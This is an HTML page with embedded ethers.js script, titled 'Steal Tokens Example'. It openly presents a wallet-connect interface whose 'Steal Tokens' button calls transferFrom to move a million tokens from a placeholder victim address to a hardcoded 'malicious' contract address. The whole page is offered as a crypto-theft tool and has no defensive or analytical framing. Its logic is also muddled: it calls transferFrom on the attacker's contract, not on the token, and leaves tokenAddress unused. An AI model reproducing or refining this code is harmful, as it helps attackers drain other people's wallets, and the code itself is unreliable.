<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steal Tokens Example</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 20px;
        }
        .button:disabled {
            background-color: #ccc;
        }
    </style>
</head>
<body>

    <h1>Steal Tokens Example</h1>
    <p>Connect your wallet and execute the function to steal tokens from another wallet.</p>

    <button id="connectWalletButton" class="button">Connect Wallet</button>
    <button id="stealTokensButton" class="button" disabled>Steal Tokens</button>

    <script>
        let provider;
        let signer;
        let maliciousContractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Contract address
        let tokenAddress = "0xYourTokenAddress"; // Replace with token address
        let contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "sender", "type": "address" },
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transferFrom",
                "outputs": [ { "internalType": "bool", "name": "", "type": "bool" } ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    console.log("Wallet connected!");
                    document.getElementById("stealTokensButton").disabled = false;
                } catch (error) {
                    console.error("Wallet connection failed:", error);
                }
            } else {
                alert("Please install MetaMask to connect your wallet.");
            }
        }

        async function stealTokens() {
            try {
                const contract = new ethers.Contract(maliciousContractAddress, contractABI, signer);
                const victimAddress = "0xVictimWalletAddress"; // Replace with victim's wallet address
                const amountToSteal = ethers.utils.parseUnits("1000000", 18); // Amount to steal, example: 1 million tokens (adjust as needed)

                const tx = await contract.transferFrom(victimAddress, maliciousContractAddress, amountToSteal);
                console.log("Steal tokens transaction sent:", tx.hash);

                await tx.wait(); // Wait for the transaction to be mined
                console.log("Tokens stolen successfully!");
                alert("Tokens stolen successfully!");
            } catch (error) {
                console.error("Error stealing tokens:", error);
                alert("Error stealing tokens. Please try again.");
            }
        }

        document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
        document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
    </script>

</body>
</html>
